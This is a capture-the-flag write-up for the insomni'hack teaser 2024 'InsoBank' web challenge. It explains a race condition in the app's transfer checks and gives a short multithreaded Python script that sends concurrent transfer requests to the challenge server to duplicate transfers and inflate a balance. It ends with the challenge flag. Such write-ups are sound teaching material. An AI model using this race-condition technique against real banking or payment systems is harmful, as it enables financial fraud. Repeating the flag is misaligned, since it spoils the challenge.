+++
author = "Matteo Golinelli"
title = "[insomni'hack teaser 24] InsoBank Writeup"
date = "2024-01-27"
description = "Writeup for the InsoBank challenge of the insomni'hack teaser 24"
tags = [
    "writeup",
    "ctf",
    "web"
]
+++

## Challenge Description

This challenge was a web application that implemented a simple banking system. In the description, they state that the bank *"is of course backed by crypto and AI which makes it better than any other banking system out there"*, but luckily a simple code review revealed that these were just lies from their marketing department.

Once a user registered, they were given **10.0 CHF** 3 bank accounts: the *Current account*, a *Checkings account*, and the *Savings account*. The application does not allow sending money to other users, but it allows to transfer money between the 3 accounts.

The process of sending money is complicated and proceeds as follows:

1. Select the account to send money from.
2. Create a **batch** of transfers linked to the selected sender account.
3. Create a **transfer** in the batch, specifying the amount and the recipient account.
4. **Validate** the batch (i.e., actually executing the transaction).

**Note:** it is only possible to have one transfer per recipient in the same batch.

### Goal of the challenge

The goal of the challenge is to have a total balance of **13.37** CHF or more in a single account:

```python
for (accountid,name,balance) in cursor.fetchall():
    if balance > 13.37:
        results[accountid] = {'name': name, 'balance': balance, 'flag': FLAG}
[...]
return jsonify(results)
```

## Vulnerability

Looking at the code, the first thing that caught our attention was the `transfer` function, responsible for creating a transfer in a batch. The function performs 4 `SELECT` queries to a MySQL database, checking that 1) the batch exists and has not been executed yet, 2) the recipient belongs to the user, 3) there is no other transfer to the same recipient in the batch, and 4) retrieving the balance of the sender account. There is no check on the amount of money transferred, because the balance is checked during the validation of the batch.

After the checks, the `transfer` functions gets a second database (PostgreSQL) and `INSERT`s the transaction in the `batch_transactions` table. The same transaction is also added to the `batch_transactions` table in the MySQL database.

The first thing that comes to mind when looking at this code is that it might be vulnerable to a (very trendy lately) **race condition**. By sending multiple requests to the `transfer` function, it might be possible to create multiple transfers to the same recipient in the same batch, and then validate the batch.

## Exploitation

We created a Python script that automates the login process, batch creation, transfer and validation. We used multithreading to send multiple requests to the `transfer` function transfering money from and to the same account, and we were able to create multiple transfers to the same recipient in the same batch.

```python
def transfer(batchid, recipient, amount):
    response = requests.post(
        'http://91.92.201.197:5000/transfer',
        headers=headers,
        json={
            'batchid': batchid,
            'recipient': recipient,
            'amount': amount,
        }

threads = []
for _ in range(10):
    t = threading.Thread(
        target=transfer,
        args=(batchid, recipient, 1) # transfer 1 CHF
        )
    threads.append(t)
for t in threads:
    t.start()
```

After validating the batch, the balance of the account immediately went down by the amount of the transfers, but after a few seconds it added the value of the transfers to the account, reaching a balance higher than the one we started with. This is probably due to the again high numer of database queries performed by the application in the `validate` function.

By repeating this process multiple times, we were able to reach a balance higher than the goal of 13.37 CHF and get the flag: `INS{have-I-l0ck3d-you-0ut?}`.
